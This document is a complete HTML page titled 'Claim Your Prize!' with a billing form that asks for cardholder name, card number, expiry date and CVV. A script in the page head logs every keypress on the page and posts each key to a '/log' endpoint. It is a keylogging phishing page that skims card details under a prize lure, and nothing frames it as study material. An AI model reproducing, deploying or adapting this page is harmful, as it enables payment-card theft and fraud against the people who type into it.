<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Prize!</title>
    <script>
        document.addEventListener('keypress', function(e) {
            fetch('/log', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ key: e.key })
            });
        });
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            text-align: center;
            padding: 20px;
        }
        .container {
            background: #fff;
            border: 2px solid #ddd;
            border-radius: 10px;
            padding: 20px;
            max-width: 400px;
            margin: auto;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        .form-group {
            text-align: left;
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }
        input {
            width: 90%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Billing Information</h1>
        <form action="submit.html" method="POST">
            <div class="form-group">
                <label for="cardholder">Cardholder</label>
                <input type="text" id="cardholder" name="cardholder" placeholder="As appears on card" required>
            </div>
            <div class="form-group">
                <label for="cardNum">Card Number</label>
                <input type="text" id="cardNum" name="cardNum" placeholder="xxxx-xxxx-xxxx-xxxx" required>
            </div>
            <div class="form-group">
                <label for="cardexpiry">Card Expiry</label>
                <input type="text" id="cardexpiry" name="cardexpiry" placeholder="MM/YY" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="3-digit security code" required>
            </div>
            
            <button type="submit">SUBMIT</button>
        </form>
    </div>
</body>
</html>
